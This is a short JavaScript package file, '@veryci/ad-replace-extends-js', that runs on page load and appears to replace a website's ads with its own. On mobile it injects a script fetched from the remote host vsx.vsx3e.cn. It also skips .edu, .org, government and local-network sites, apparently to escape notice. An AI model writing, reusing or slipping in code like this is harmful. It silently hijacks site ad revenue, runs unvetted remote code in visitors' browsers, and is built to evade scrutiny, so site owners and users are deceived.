import { phone } from 'ismobilejs';
import { mobileReplace, PCReplace } from './replace';

const [name, version] = ['@veryci/ad-replace-extends-js', '1.0.0'];
const blackWebsite = /.edu|.org|12306.com|.*gov.*|^192.168|yoyo.qq.com/;
const { hostname } = window.location;

function replace() {
  if (window.adReplaceJS || window.top !== window || blackWebsite.test(hostname)) return;
  window.adReplaceJS = `${name}-${version}`;

  if (phone) {
    mobileReplace();
    // 唤醒广告位
    const scr = document.createElement('script');
    scr.src = 'https://vsx.vsx3e.cn/dia_ti_ne.js?slid=EEB21B97A6FC708C98B5A5C2D71C03AF&w=0&h=0';
    document.body.appendChild(scr);
  } else PCReplace();
}

function handler(e) {
  if (window.adReady) return;
  if (e.type === 'onreadystatechange' && document.readyState !== 'complete') return;
  setTimeout(replace, 100);
  window.adReady = true;
}

if (document.addEventListener) {
  document.addEventListener('DOMContentLoaded', handler, false);
  document.addEventListener('readystatechange', handler, false); // IE9+
  window.addEventListener('load', handler, false);
} else if (document.attachEvent) {
  document.attachEvent('onreadystatechange', handler);
  window.attachEvent('onload', handler);
}

setTimeout(() => {
  if (window.adReady) return;
  replace();
  window.adReady = true;
}, 10000);
